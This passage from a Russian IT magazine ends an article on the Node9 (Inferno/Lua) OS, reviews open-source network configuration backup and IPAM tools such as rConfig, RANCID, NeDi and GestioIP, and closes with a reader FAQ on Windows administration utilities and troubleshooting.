•  Долгое время операционная система Inferno применялась в некоторых ап-
   паратных решениях Lucent (позднее Alcatel-Lucent), таких как файрволы
   и шлюзы. Достоверно известно, что внутри Lucent Managed Firewall, Lucent
  VPN Firewall Portfolio и Lucent Pathstar скрыта именно ОС Inferno.
•  На основе операционной системы Inferno работали некоторые модели ап-
   паратов для SIP-телефонии, в частности Philips IS2630 и Alcatel Webtouch.
•  Некоторые исследовательские центры и университеты выбирают Inferno
   в качестве платформы для grid-вычислений: Cambridge Crystallography Data
   Centre (CCDC), The University of York Department of Biology, Rutgers University
    Libraries, Evotec OAI AG (Deutsche Boerse EVT; TecDAX 30), Montclair State
    University.



ПРОБУЕМ
В данный момент Node9 находится в стадии пре-бета. Работать она работает,
софт запускать позволяет, планировщик планирует, libuv обрабатывает, одна-
ко многие функции Inferno до сих пор остаются нереализованными. Например,
пока что нет возможности создать файловый сервер (в терминологии Plan 9
/ Inferno это приложение, экспортирующее собственные интерфейсы через
файлы), невозможно смонтировать каталоговую структуру удаленной машины,
но можно открыть для монтирования для Plan 9 машин. Тем не менее с плат-
формой уже есть смысл познакомится хотя бы для оценки ее возможностей
в текущем состоянии (веб-приложение для нее можно написать уже сейчас).
   Итак, Node9 доступна на GitHub и в данный момент умеет работать только
в OS X и Linux, а после полного перевода системы на libuv заявлена поддержка
множества других систем. Устанавливаем git и клонируем репозиторий:

$ git clone https://github.com/jvburnes/node9.git
$ cd node9

Сборка системы осуществляется с помощью приложения premake, а для сбор-
ки LuaJIT понадобится еще и automake. Все остальные инструменты сборки
стандартные, поэтому установки пакета build-essential в Ubuntu и его аналогов
в других дистрибутивах будет достаточно. После этого просто запускаем сбо-
рочный скрипт и ждем:

$ ./rebuild.sh

После успешного завершения компиляции запускаем систему (любители бе-
лых яблочек заменяют LD_LIBRARY_PATH на DYLD_LIBRARY_PATH):

$ export LD_LIBRARY_PATH=./lib
$ bin/node9

На экран должно вывалиться приглашение командной строки. Это местный
шелл, возможностей у него кот наплакал: стандартные cd, ls, cat и несколько
команд, которые ты найдешь в каталоге fs/appl. Сама система будет заперта
в песочнице, корнем которой будет каталог fs внутри каталога с установленным
Node9. Предварив команду пробелом, ее можно превратить в Lua-выражение.
Никаких стандартных для UNIX пайпов и перенаправления ввода-вывода пока
нет, только три команды, только хардкор.





Шелл Node9

Для запуска своего Lua-скрипта просто кладем его в fs/appl, а затем запускаем
как обычную команду, опустив расширение (.lua). API здесь отличается от стан-
дартного Lua. Базовые «системные вызовы» включены в модуль sys. Чтобы озна-
комиться с ними, можно почитать исходник appl/syscall.lua. Модуля для сетево-
го взаимодействия нет вообще, вместо него, как и положено, файлы, в данном
случае каталог /net. Чтобы узнать, как с ним работать, можно почитать исходни-
ки в каталоге fs/appl. Также в состав включена Lua-библиотека Penlight с набо-
ром функций для манипуляции с разными типами данных. В остальном ничего
экстраординарного. Обычный проект в своей постначальной стадии развития.
Готовый каркас, который осталось только допилить и завернуть в красивую упа-
ковку.





Часть исходника fs/mount.lua





LuaJIT vs Lua

ВЫВОДЫ
Node9 — более чем интересный проект. Его разработчики решили исправить
то, чем Inferno всегда отпугивала программистов. Я сильно сомневаюсь, что эта
система когда-нибудь приобретет большую известность, хотя бы потому, что
Lua у многих программистов не ассоциируется с чем-то серьезным (даже если
таковым является). Но свою нишу она вполне способна занять, благо большая
часть работ по разработке платформы уже выполнена.
SYNACK
ХРАНИТЕЛИ СЕТИ





    OPEN SOURCE УТИЛИТЫ ДЛЯ УПРАВЛЕНИЯ,
       МОНИТОРИНГА И БЭКАПА НАСТРОЕК
          СЕТЕВОГО ОБОРУДОВАНИЯ




                                             Мартин «urban.prankster»
                                                Пранкевич
                                                            martin@synack.ru

Современная сеть насчитывает десятки маршрути-
заторов. И с ростом их количества все тяжелее и тя-
желее помнить и отслеживать изменения настроек,
разбираться с коллизиями IP. В такой ситуации все
большее значение приобретают системы управления
IP-адресации, позволяющие планировать распреде-
ление IP, мониторить и бэкапить установки сетевого
оборудования, снабжать админа полезными отчета-
ми. Свои варианты часто предлагают сами произво-
дители оборудования, но также имеются универсаль-
ные open source инструменты.

RCONFIG
rConfig (rconfig.com) — веб-приложение, выполняющее, по сути, одну важную
задачу: снимок конфигурации сетевых устройств и массовое развертывание
настроек. Администратор может самостоятельно настроить список команд,
которые должны быть выполнены на отдельном устройстве или определенной
группе, при этом команды можно соотносить с категориями. Для удобства по-
следующего отбора и задания команд в интерфейсе можно определять любое
количество категорий, добавлять информацию о производителях, логотипы
и произвольные поля. Для управления используется Telnet или SSH. В настрой-
ках устройства указывается стандартная информация для подключения (логин,
пароль, IP-адрес и порт) и дополнительная информация о конкретном устрой-
стве. Команды объединяются в задачи, которые назначаются для выполнения
определенным категориям в указанное время, задается интервал повторения
(используется cron). Логи сохраняются на диск, при этом они распределяют-
ся по каталогам, соответствующим категории, устройству и времени. Причем
в течение дня можно загружать несколько копий конфигурации, все автомати-
чески получат свою метку времени. При экспериментах с сетевыми настрой-
ками это выручает. Доступна функция сравнения сохраненных конфигураций,
статистика, просмотр журналов, поиск нужного параметра в любой категории,
отчеты по настройкам и найденным изменениям. Результаты могут отправлять-
ся на email. Функция Configuration Compliance Management позволяет контро-
лировать конфигурации устройств для соответствия политике.
   Распространяется по лицензии GNU GPL. Проект предлагает демоверсию,
перед ее использованием потребуется регистрация. Правда, она реализована
на старой версии 2, в которой отсутствует ряд возможностей. Поэтому, что-
бы получить полное представление, потребуется самостоятельно установить
rConfig.
   Написан на PHP, для хранения информации задействуется MySQL, фай-
лы хранятся на FTP-сервере. Требования к оборудованию невелики. По сути,
для развертывания требуется обычный LAMP-сервер с отдельными специфи-
ческими модулями PHP, о наличии которых придется побеспокоиться. Доку-
ментации проект особо не предлагает, только небольшую инструкцию по уста-
новке в CentOS 6.x. В архиве с исходными текстами есть заготовки именно под
этот дистрибутив. Вероятно, его можно считать рекомендуемым разработчи-
ками. Хотя инструкция чуть устарела даже для 6.x, то есть просто скопировать
команды в окно терминала в расчете, что все возьмет и заработает, не выйдет.
При развертывании в CentOS 7 выплывает еще несколько «мелочей». Для дру-
гих дистрибутивов придется уже разбираться с различиями по названию паке-
тов и устройству дерева файловой системы. Но после установки дальнейшие
настройки вполне понятны, хотя интерфейс и не локализован.





rConfig — управление командами, выполняемыми на устройствах

RANCID
RANCID (shrubbery.net/rancid) (расшифровывается как Really Awesome New
Cisco confIg Differ) — набор утилит, которые производят мониторинг маршрути-
заторов, опрос конфигураций, включая ПО и аппаратные средства (карты, се-
рийные номера и прочее), резервирование настроек. Принцип работы прост.
После запуска производится подключение к устройствам, прописанным в базе
данных (router.db), выполняются запросы, необходимые для получения нужной
информации, данные форматируются, удаляется лишнее, результат фиксиру-
ется в системе контроля версий CVS или Subversion. При необходимости от-
правляется email, в котором показываются все изменения по сравнению с пре-
дыдущей версией (в документации есть пример такого сообщения). В случае
выхода из строя роутера администратор может быстро перенести все настрой-
ки на новое устройство. Для подключения используются протоколы SSH, Telnet
или RSH. Из коробки поддерживаются устройства многих производителей:
Allied Telesis AW+, Cisco, Juniper, Mikrotik, Catalyst, HP Procurv и других. Поддерж-
ка части железа реализована в виде модулей, которые можно скачать отдельно
на сайте проекта. К сожалению, полного списка проект не предоставляет и вы-
яснить, будет ли работать RANCID с конкретным маршрутизатором, чаще мож-
но, лишь проверив на практике. Интерфейса для настроек проект не предлага-
ет. Есть CGI-файл, позволяющий персоналу при помощи браузера выполнять
набор ограниченных команд, не требующих пароля (пакет rancid-cgi). Вот, соб-
ственно, и все. Список доступных команд указывает сам админ, просто снимая
комментарии в файле настройки (Ubuntu /etc/rancid/lg.conf). Но конечно, мож-
но использовать любой удобный интерфейс к CVS или Subversion для просмо-
тра сохраненных конфигураций.
   Все основные установки выполняются в конфигурационном файле rancid.
conf. В основном здесь стандартные параметры — размещение файлов, уста-
новки для отправки email. Часто что-то менять здесь нет необходимости. Но на-
пример, LIST_OF_GROUPS задает группу сетевых устройств, для которых будет
производиться менеджмент конфигураций. Таким образом, мы можем сгруп-
пировать отдельно маршрутизаторы и коммутаторы или разделить устройства
в зависимости от администраторов, поддерживающих данные устройства.
   Параметры доступа к сетевым устройствам (логин, пароль, протокол, алго-
ритмы шифрования и шаблоны) описываются в файле .cloginrc, расположен-
ном в домашнем каталоге пользователя, из-под которого будет происходить
запуск rancid. Обычно заводят отдельную учетную запись, которая так и назы-
вается — rancid:

add user 10.10.10.* sysadmin
add password 10.10.10.* pass enable_pass
add method 10.10.10.*    ssh

База данных маршрутизаторов router.db представляет собой текстовый файл
в формате «имя или IP:производитель:состояние»:

10.10.10.1:cisco:up
router.example.org:juniper:down

В комплекте идет несколько утилит (в Ubuntu они размещены в /var/lib/rancid/
bin). Самая главная — rancid-run, запускающая собственно процесс сбора
данных, после всех настроек его инициируют через cron. Утилита rancid-cvs по-
зволяет инициализировать хранилище, создавая каталоги для каждой группы
устройств. Ее необходимо запустить, когда будут готовы конфигурационные
файлы. Почти два десятка утилит \*login представляют собой команды доступа
к маршрутизаторам разных производителей. Например, mtlogin позволяет под-
ключаться к роутерам Microtik, clogin — к Cisco, jlogin — к оборудованию Juniper
Networks и так далее. Их можно использовать для проверки подключения и руч-
ного управления устройствами, удобного выполнения команд и скриптов:

$ /var/lib/rancid/bin/clogin -c "show clock" 10.10.10.1
$ /var/lib/rancid/bin/clogin -x script_name

Установка возможна на FreeBSD, Linux, OS X и Solaris. В большинстве систем
и дистрибутивов нужный пакет, как правило, присутствует в репозитории. Сами
разработчики рекомендуют FreeBSD. На сайте есть ссылки на статьи с приме-
рами. Для Linux придется их адаптировать под свой дистрибутив.
   Явных функций восстановления RANCID не имеет. В зависимости от кон-
кретного устройства можно использовать стандартные функции бэкапа или
просто скопипастить настройки в строку конфигурирования. В Cisco, напри-
мер, для этих целей подходит стандартный copy running-config. Выкладываем
файл на FTP и указываем на него (в privileged mode):

> enable
# copy running-config ftp://user:password@example.org/file





Основные настройки RANCID производятся в конфигурационном файле rancid.conf

О возможностях проекта говорит то, что RANCID используют такие компании,
как AOL, Global Crossing, MFN, NTT America и другие.

NEDI — NETWORK DISCOVERY
NeDi (www.nedi.ch) — продвинутая система для управления, инвентаризации
сетевого оборудования и визуализации сети, распространяемая под лицен-
зией GNU GPL. C ее помощью можно производить в автоматическом режиме
поиск и инвентаризацию сетевых устройств, исследовать узлы, которые к ним
подключены, получать информацию (версия ПО, IP, MAC, конфигурация, вен-
дор, данные о загрузке интерфейсов, процессора, памяти, температурный ре-
жим) с сохранением журналов и построением наглядных графиков с помощью
rrdtool. В том числе можем обнаруживать и мониторить виртуальные машины
в виртуальных средах. Реализована поддержка API системы мониторинга Cacti,
которая используется для отрисовки графиков. Также выполняется резервиро-
вание конфигурации маршрутизаторов, возможно отслеживать некоторые дру-
гие сетевые события, например расход бумаги на сетевом принтере. Кроме
собственно обнаружения, ведется мониторинг, и при выходе из строя устрой-
ства, отключении порта и некоторых других событиях (появление в сети нового
устройства, создание бэкапа) администратор получает email или SMS. Доступ-
ны некоторые отчеты: устройства, состояние, события, инциденты и другие.
Администратор может настроить фильтры отбора устройств по нужному кри-
терию. Доступны кнопки, позволяющие одним нажатием отобрать нужную ин-
формацию: например, самые загруженные, самые быстрые, самые горячие,
не мониторящиеся. Поддерживается оборудование разных производителей,
модульная архитектура в виде def-файлов позволяет легко добавить поддерж-
ку устройств любого производителя (при помощи утилиты Defgen).
   NeDi также весьма полезный инструмент для мониторинга безопасности
сети. Он легко обнаруживает новое проводное или беспроводное устройство,
изменения в IP-адресации, появление в сети устройства, помеченного как про-
павшее. О событиях администратора предупреждает всплывающее окно и зву-
ковой сигнал. Графики показывают проблемные перегруженные места в сети.
Функция идентификации хоста позволяет отслеживать открытые порты Telnet
или SSH.
   Для обнаружения и сбора данных используется SNMP, поддерживаются про-
токолы CDP (Cisco Discovery Protocol), FDP (Foundry Discovery Protocol) и май-
крософтовский LLTD (Link Layer Topology Discovery). Для получения МАС-адре-
сации и прочей информации с роутеров на базе Cisco IOS (и некоторых других)
может быть использован привилегированный CLI. Такой способ быстрее, чем
сканирование VLAN, но его уже нужно будет настраивать персонально, указы-
вая пароли для доступа к Telnet или SSH. Основным методом остается все-таки
SNMP. Проверяются также DNS- и NTP-сервисы. Конфигурации хранятся в БД
(MySQL или PostgreSQL) или в виде текстовых файлов. После обнаружения ад-
министратор может самостоятельно добавить описание и назначить более на-
глядный значок для конкретного устройства.
   Возможна одновременная работа нескольких администраторов, организо-
ван простой чат для быстрого обмена информацией. Кроме собственной базы
пользователей, привлекается LDAP и RADIUS. Есть несколько полезных инстру-
ментов вроде IP-калькулятора и конвертера текста. Реализован простой бэкап
и восстановление настроек самого NeDi.
   Фактически NeDi представляет собой несколько Perl-скриптов для конкрет-
ной задачи: обнаружения, мониторинга, записи событий в БД, SNMP и генери-
рования статистики. Для их запуска используется консоль, GUI и cron.
   Вся информация выводится через веб-интерфейс, имеющиеся шабло-
ны позволяют его одинаково комфортно просматривать как на ПК с большим
экраном, так и на мобильном устройстве. Вид можно менять при помощи тем.
Интерфейс, правда, доступен только на английском, итальянском и немец-
ком. Локализация реализована в виде HTML-файлов, и при желании можно
перевести самостоятельно по мере внедрения. После регистрации в первом
окне Welcome to NeDi (находится в User -> Profile) выдаются общие подсказ-
ки по дальнейшим действиям: уточнению настроек, установке отправной точки
для сканирования и сканированию сети, настройке задач и мониторингу SNMP.
Просто нажимаешь на значок и переходишь к пункту, а можно сам значок поис-
кать в меню. Бэкап устройства может быть произведен в CLI непосредственным
запуском nedi.pl или в GUI Devices -> List -> Status. Информация сохраняет-
ся обычно в /var/nedi/config. Восстановление настроек лежит исключительно
на администраторе.
  В большинстве случаев установки через интерфейс производятся при по-
мощи редактирования конфигурационных файлов, для удобства все они собра-
ны в раскрывающийся список. В основном файле nedi.conf следует прописать
правильные параметры для сканирования SNMP (обязательно), опционально
политики доступа к CLI, маску IP, настройки подключения к БД, отправку email
и SMS, выводимые сообщения, интеграцию с Cacti и другое. Отступы следует
делать табом.
   Интерфейс написан на PHP, поэтому для работы нам потребуется обычный
LAMP-сервер. Проект предлагает инструкции по установке на FreeBSD, OS X
и SUSE. Вероятно, можно их считать рекомендуемыми, хотя NeDi прекрасно
работает и в любом другом Linux. Руководства для других ОС можно поискать
в Сети и адаптировать под текущий релиз. Также ответы на некоторые вопросы
есть на форуме. Кроме архива с исходными текстами, предлагается готовый
ISO-образ, собранный на базе OpenBSD, и образ для VMware (пароль в CLI —
root/root, веб — admin/admin). Образ для VMware полностью настроен, при на-
личии DHCP-сервера получает IP автоматически, после чего можно заходить
через веб и начинать работу. Знание особенностей OpenBSD не требуется. Под-
готовлены несколько команд, позволяющих быстро выполнить основные опе-
рации, все они показываются при загрузке (ne запускает NeDi, wa — snmpwalk,
er выводит ошибки веб-сервера и так далее). Проект предлагает документа-
цию плюс видео на своем канале. В принципе, материала достаточно, чтобы
при желании разобраться.





После регистрации NeDi показывает список основных задач





Редактирование конфигурационного файла при помощи веб-интерфейса NeDi


GESTIOIP
GestioIP (gestioip.net) сами разработчики относят к классу IPAM (IPv4/IPv6 Address
Management). Это веб-приложение для управления IP-адресацией сетей, ав-
томатического обнаружения сетевых устройств, позволяющее администрато-
ру быстро получить нужные данные и произвести настройки. Для обнаружения
узлов, сбора информации о них и мониторинга состояния используется SNMP,
DNS и ICMP (Ping). База данных устройств может быть заполнена автоматиче-
ски путем сканирования сети, при помощи импорта из XLS-файлов или вручную.
Таблицы маршрутизации могут быть как статическими, локальными, так и об-
новляться при помощи протоколов динамической маршрутизации OSPF, RIP,
IS-IS и EIGRP. Фильтры и функции поиска позволяют легко найти информацию
об IP-адресах или хостах, провести аудит. Есть три варианта просмотра сетей:
по IP, по типу и по статусу. Корневые (root) сети являются контейнерами, позво-
ляющими удобно сгруппировать подсети, но не содержат конечных станций.
Включает систему управления линиями dial-up и VLAN. Доступные инструменты
позволяют легко произвести разделение, слияние, расширение, уменьшение
сетей с сохранением записи хостов, найти сети с перекрывающейся адресаци-
ей, бронировать IP (для DHCP, например). Есть в поставке IP-калькулятор. Мож-
но сгенерировать готовые установки DNS-зон для серверов BIND или djbdns.
Инструмент IPv6 Migrator позволяет генерировать IPv6. Есть функция экспорта
в CVS, ведется статистика.
   Поддерживается интеграция с open source системой инвентаризации OCS
Inventory NG. Возможна аутентификация на основе Apache mod_auth (под-
держивается внутренняя база пользователей) и интеграция с Active Directory
и LDAP.
  По сути своей это веб-приложение, написанное на Perl, все задачи выпол-
няются при помощи CGI-скриптов, запускаемых вручную из GUI или через cron.
Интерфейс несложный, параметров для настройки немного, выводимые дан-
ные настраиваются. Хотя, чтобы разобраться с некоторыми особенностями,
придется заглянуть в документацию. Большой плюс — интерфейс изначально
поддерживает русский.
   Распространяется GestioIP по лицензии GNU GPL. Также разработчи-
ки предлагают коммерческий модуль (gestioip.net/configuration_backup_and_
management.html), позволяющий автоматически делать бэкап и восстановле-
ние установок сетевых устройств, управлять их конфигурациями, выполнять
команды и сохранять вывод. Поддерживается одновременный запуск команд
на нескольких маршрутизаторах. Полученные настройки хранятся централи-
зованно, поддерживается история, есть функция сравнения конфигураций
и результатов запущенных заданий. Например, можно очень просто сохранить
ARP-кеш за некоторый период, затем сравнить и увидеть, есть ли изменения.
В качестве шаблонов заданий и опроса устройств используются XML-файлы.
Это упрощает самостоятельное создание нужных установок.
   Для развертывания потребуется Apache с модулем mod-perl и MySQL. Под-
ходит любая *nix и Win, но рекомендуется Linux. Проект предлагает архив с ис-
ходными текстами и четыре внятных руководства по установке и настройке (на
английском). Установка упрощается тем, что разработчики подготовили скрипт
(./setup_gestioip.sh), который проверяет все необходимое и автоматически
доустанавливает нужные Perl-модули. В Ubuntu следует подключить universe,
причем проверяется запись в /etc/apt/source.list, если universe прописан
в одном из файлов в /etc/apt/source.list.d, скрипт запись не найдет. Даль-
нейшие донастройки производятся в мастере.





Установка GestioIP упрощается подготовленным скриптом





Наглядная статистика GestioIP


ВЫВОД
Управление IP-адресами — это непрерывный процесс, включающий в себя
планирование, мониторинг, настройки, резервирование, перенос установок
на новые устройства. При большом количестве устройств без специальных
IPAM-систем он становится очень сложным. Так что рекомендуем присмотреть-
ся к одному из описанных решений.
                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
ЕСТЬ ВОПРОСЫ — ПРИСЫЛАЙ

                       НА FAQ@GLC.RU





Q  Есть ли какие-то сборники софта по хак тулзам под винду?
     Да! Есть очень интересный инструмент, который, думаю, тебя заинтере-
A  сует. Называется он Pentest Box. Его создал Адитья Аргавал после изуче-
ния статистики загрузок различных хак-инструментов. Больше половины скачи-
вающих оказались пользователями Windows. Сборник представляет собой
архив на 2,5 гигабайта различного софта. Ничего настраивать не нужно, все
готово к работе. Если вдруг захочется что-то добавить, все необходимые ин-
струкции есть на сайте. Инструмент удобен еще и тем, что не требует установки
и позволяет себя переносить, скажем, на флешке или даже в памяти телефона.

Q  Какая есть альтернатива cmd под Windows?
    Дефолтная консоль, действительно — жутко неудобная штука. Нет нор-
A  мального буфера обмена, подсветки и еще кучи различных полезных фич,
к которым очень быстро привыкаешь. В качестве интересной альтернативы
могу предложить ConEmu — это эмулятор консольного окна Windows. Вот что
пишет сам разработчик:
   «При запуске нового консольного приложения в ConEmu реальное окно
консоли не отображается, а весь вывод и ввод перехватывается и перенаправ-
ляется в ConEmu. Основное назначение — совместное использование с Far
Manager. Но в ConEmu можно запускать и другие приложения: cmd, powershell,
dn, putty, notepad, и т.п.»
  Помимо этого есть огромное количество разных крутых штук:
•  Простой ресайз окна консоли, максимизация и полноэкранный режим
    (Alt+Enter), который не требует перевода видекарты в текстовый режим;
•  Отсутствие проблемы появления полос прокрутки в Far при блокировании
   (засыпании) компьютера;
•  Встроенная поддержка мультиконсоли (несколько приложений в одном
   окне ConEmu), возможность запускать новые приложения от имени админи-
   стратора;
•  Простой запуск приложений для DOS в Windows 7 и 64-битных ОС через
   DosBox;
•  При выполнении консольных приложений, запущенных из Far, высота кон-
   сольного буфера автоматически увеличивается;
•  Встроенная поддержка Drag&Drop между панелями и другими приложениями;
• Можно использовать и с другими консольными программами (например
   cmd.exe) с установкой высоты буфера и прокруткой окна с клавиатуры;
•  Возможность переключения между окнами Far (панели, редактор, вьювер)
   через закладки, отображаемые в верхней части окна ConEmu;
•  Выбор типа сглаживания шрифтов, выбор шрифта и его размера плюс какая-
   никакая поддержка немоноширинных шрифтов;
•  Все настройки загружаются из реестра (или файла XML), допускается ис-
   пользование множества конфигураций, имя загружаемой конфигурации
   можно указать в параметрах запуска;
•  Поддерживаются нестандартные цвета консоли;
•  Короткий правый клик мышкой в Far — выделение файлов, длинный правый
   клик — вызов контекстного меню проводника для элемента;
•  Окно можно делать прозрачным!





Q Какую ОС можешь посоветовать для форензики, кроме Kali?
    Попробуй присмотреться к Parrot security OS. Это интересный дистрибу-
A  тив, основанный на Debian и созданный для пентестеров и реверсеров.
Отлично подходит для анонимного серфинга и форензики. Есть огромное ко-
личество предустановленного софта. Многое перекликается с небезизвест-
ным Kali Linux, но есть и специфичные тулзы, список которых можно посмотреть
на официальном сайте. Внешне дистрибутив выглядит неплохо, часто обновля-
ется и пополняется софтом.





    После установки в сервер на Windows дополнительной сетевой
Q  карты в логи посыпались ошибки:  A duplicate name has been
detected on the TCP network. Как это лечить?
    Подобные ошибки возникают тогда, когда каждый интерфейс регистри-
A  рует одни и те же имена NetBIOS. Поэтому для начала нужно определить-
ся, на каком интерфейсе у тебя будет сервер. Предположим, 192.168.29.1.
Значит, ты идешь в свойства сетевого окружения и у всех интерфейсов кроме
192.168.29.1 снимаешь галки у служб. Заодно в свойствах `TCP/IP -> Дополни-
тельно` можешь отключить NetBIOS over TCP/IP. После этого можно проверить,
что изменилось, командой nbtstat -n. Ошибок больше быть не должно.


                                                Полезный хинтРАЗВОРАЧИВАЕМ ОС УДАЛЕННО

    Как можно автоматизировать разворачивание ОС на компьютерах
Q  в домене Windows?
    Я рекомендую использовать утилиту Windows Deployment Services (WDS),
A  которая доступна в Windows Server начиная с версии 2003 года. Несмотря
на то, что базовая функциональность с тех пор не менялась, в версии для
Windows Server 2012 много новых фишек. Сама по себе WDS — не решение для
развертывания, а важный инфраструктурный компонент, который используется
настоящими решениями по развертыванию, такими как MDT и Configuration
Manager.
   Несмотря на то, что с технической точки зрения WDS способна развернуть
образ ОС и даже обеспечивает ограниченную поддержку механизма внедре-
ния драйверов (driver-injection mechanism), в ней нет функций, необходимых для
развертывания клиентов и серверов Windows на предприятии. Поэтому лучше
всего использовать WDS вместе с MDT или Configuration Manager. Такой ком-
байн поддерживает следующие ключевые функции:
•  Запуск загрузочных образов MDT или Configuration Manager через механизм
   сетевой загрузки (Pre-boot Execution Environment, PXE).
•  Развертывание клиентов и серверов всех поддерживаемых в настоящее
   время ОС.
•  Интерфейс управления для создания решения и управления им.
•  Управление ходом всего процесса развертывания через последовательно-
   сти задач.
•  Наблюдение за развертыванием в режиме реального времени.
•  Отличные механизмы внедрения драйверов.
•  Динамическое задание параметров при развертывании ОС.
•  Автоматическое развертывание обновлений Windows с выполнением всех
   требуемых перезагрузок.





WDS



    Как добиться, чтобы в консоли Windows отображался русский
Q  текст?
    Для начала давай разберемся, почему он не отображается. Консоль ра-
A  ботает в кодировке DOS, это codepage 866. Тот же «Блокнот» создает
файл в кодировке Windows 1251. Поэтому, когда ты смотришь файл, консоль
отображает его в своей, досовской кодировке. Обойти это можно несколькими
способами. Во-первых, можно открыть файл тем же Notepad++ и сохранить с
его помощью файл в кодировке OEM-866. Для этого нужно сделать следующее:
•  Открываем меню Кодировки -> Кодировки -> Кириллица -> OEM-866
•  Файл -> Сохранить как -> Пишем имя файла и расширение bat или cmd ->
   Сохранить

Чтобы правильно сконвертировать уже имеющийся в редакторе код с кирил-
лицей:
•  войти в редактор;
•  скопировать текст (Ctrl+A);
•  удалить текст;
•  меню Кодировки -> Кодировки -> Кириллица -> OEM-866;
•  вставить текст;
•  сохранить, запустить.

В Windows 7 часто бывает так, что текст, скопированный из браузера, в буфере
превращается в тарабарщину — это будет видно при вставке в тот же «Блок-
нот». Излечить это несложно: просто переключись на русскую раскладку при ко-
пировании. Для скриптов более правильный метод — смена кодовой страницы.
Для шелловых скриптов добавляем в начало строку `chcp 1251 >nul`. Правда,
этот трюк не позволит выполнить команду `echo хакер Вася` — на выходе будут
кракозябры. А вот создать папку с русским названием при помощи `md` выйдет.
   Для вывода сообщений можно использовать другой трюк:

chcp 1251 >nul
for /f "delims=" %%A in ("хакер Вася") do >nul chcp 866& echo.%%A

ИНСТРУМЕНТЫ ДЛЯ АДМИНИСТРИРОВАНИЯ WINDOWS


Какие инструменты можно использовать для администрирования сер-
веров и рабочих станций на Windows?
Утилит, которые упрощают жизнь — масса. FarManager, Notepad++, 7-zip и так
далее и тому подобное. У каждого есть свой набор и свои предпочтения. Кто-
то отключает всю графику или наоборот ставит ядовито-зеленый фон. Главное,
чтобы было удобно работать и пользоваться привычными инструментами. Ведь
от этого напрямую зависит продуктивность.

             Тулзы Марка Руссиновича. В этом наборе есть всё, что тебе мо-
     1    жет понадобиться в повседневной жизни. И управление автоза-
              грузкой, и софт для работы с процессами, и удобнейший редак-
             тор AD, и огромное количество другого софта. Такую сборку
            нужно иметь под рукой, даже если ты не админ. В руках с хорошим
             отладчиком можно докопаться до причины любой проблемы.

            Отличным подспорьем может служить подборка утилит из Unix, о
   2    которой мы уже не раз писали. Сборка состоит из наиболее ис-
            пользуемых команд вроде find, exeс и прочих. При работе с кон-
            солью они становятся мощным подспорьем. Не стоит обходить
            стороной и PowerShell — обязательно присмотрись к нему, с его
           помощью можно решить многие задачи.

            «Портативные» инструменты, которые можно сделать самостоя-
   3    тельно или скачать целыми сборками. Может показаться, что они
            совершенно не нужны, но стоит отправиться чинить удаленный
             от офиса компьютер, где нет ничего кроме 1С, и сразу понима-
             ешь, что без набора инструментов далеко не уедешь. Не обяза-
             тельно иметь 64 гигабайта разношерстного софта — собери
           свою подборку, и она послужит тебе верой и правдой.

             Загрузочная флешка или целый внешний диск с различными дис-
   4    трибутивами. Антивирус, софт для работы с диском, легкий дис-
             трибутив для работы с интернетом и все в таком духе. Продол-
             жать можно очень долго, к тому же у каждого администратора
             своя специфика работы.


Q  Есть ли аналог remmina под Windows?
     Лично я пользуюсь Remote Desktop Connection Manager. Программа не но-
A  вая, но работает и со своей задачей справляется. Для управления серве-
рами могу порекомендовать консоль, и это не шутка. Серверы на Windows сей-
час тоже могут управляться через консоль — через различные скрипты PowerShell
и диспетчеры. Для удобства можно использовать ConEmu. Стоит посмотреть и
в сторону Terminals. Поможет и RDPDesk — правда, проект умер, и программа у
многих выдает ошибки при подключении, так что будь внимателен.

Q В чем лучше всего вести техническую документацию?
    Здесь легко развести целый холивар. Сколько людей, столько и мнений,
A  плюс обычно есть определенные корпоративные стандарты и регламен-
ты, которые в каждой компании свои. Лично мне очень понравилась опенсорс-
ная DokuWiki. Кто-то, конечно же, скажет, что это не специализированное ре-
шение и не совсем подходит, но я считаю, что ее хватает за глаза. Добавить
схемы локальных сетей, приатачить архивы с нужными документами, создать
разветвленную систему с правами доступа для разных пользователей — всё
это можно сделать буквально парой щелчков мыши. Есть документация и воз-
можность что-то переписать самостоятельно.
   Если используется сервер на Windows, то подойдет SharePoint. Это, конеч-
но, тоже спорное решение, но при грамотной настройке SharePoint превраща-
ется мощный комбайн с кучей возможностей. Из минусов — конечно же, цена
и определенные сложности в поддержке.

    Какую программу можно использовать на Android для подключе-
Q  ния по RDP через шлюз?
    Программ для подключения по RDP немало, но лучше использовать фир-
A  менную утилиту — Microsoft Remote Desktop. У него, пожалуй, один суще-
ственный минус — невозможность отключить графику, чтобы не тянуть с уда-
ленного хоста обои и прочие рюшки, которые просто жрут трафик, не неся
полезной нагрузки. Сам интерфейс удобен и поддается настройке.





Microsoft Remote Desktop

    На ноутбуке через равные промежутки времени отваливается Wi-
Q  Fi, что можно сделать, куда смотреть?
    На самом деле, вариантов неполадок очень много, начиная с неправиль-
A  ной настройки роутера и заканчивая проблемами с драйверами на самом
ноутбуке. Для начала можно потестировать Wi-Fi на телефоне или, ещё лучше,
на другом компьютере. Если другие устройства держат соединение нормаль-
но, то, скорее всего, виноват ноутбук. Тогда стоит переустановить драйверы
и посмотреть логи системы. Стоит узнать, поддерживает ли ноутбук режим ра-
боты точки (b/g/n), возможно, проблема в этом. Обрати внимание и на пере-
крытие сетей — вдруг твою сеть глушит соседская. Другой причиной может
быть энергосбережение: ноутбук может отключать Wi-Fi, пытаясь сэкономить
заряд. Лечится это отключением сохранения энергии в настройках драйвера
беспроводного адаптера ноутбука. Если ничего не помогает, и мысли кончи-
лись, попробуй загрузиться с LiveCD и поработать подключиться, это может
прояснить ситуацию.
   Ну и не стоит забывать про снифферы вроде того же Wireshark. Он способен
многое рассказать о том, что делает твой ноутбук.

    Когда в cmd запускаешь команду ping с ключом /t, она быстро за-
Q  бивает весь экран. Есть ли возможность получить статистику по
полученным/потерянным пакетам, без завершения команды?
     Конечно! Для этого нужно использовать комбинацию клавиш `ctrl+break`,
A  после которой система покажет подробную статистику по пакетам и про-
должит пинговать заданный узел.


ОДНОЗНАЧНОГО ОТВЕТА НЕТ:
СЕТЕВОЙ ПРИНТЕР ДЛЯ МАЛОГО ОФИСА
ИЛИ ДОМАШНИЙ ЛАЗЕРНИК?



        Для малого офиса с головой хватит лазерного принтера, предназна-
        ченного для домашнего использования. Стоит недорого, легко рас- 1
        шаривается и печатает. Да, нужно держать компьютер включенным, но
         это не такая уж проблема. При желании можно докупить принт-сервер
        и сделать принтер практически сетевым. Можно его мапить при сое-
        динении по RDP и свободно печатать.

        Сетевой принтер можно без плясок с бубном настроить для использо-
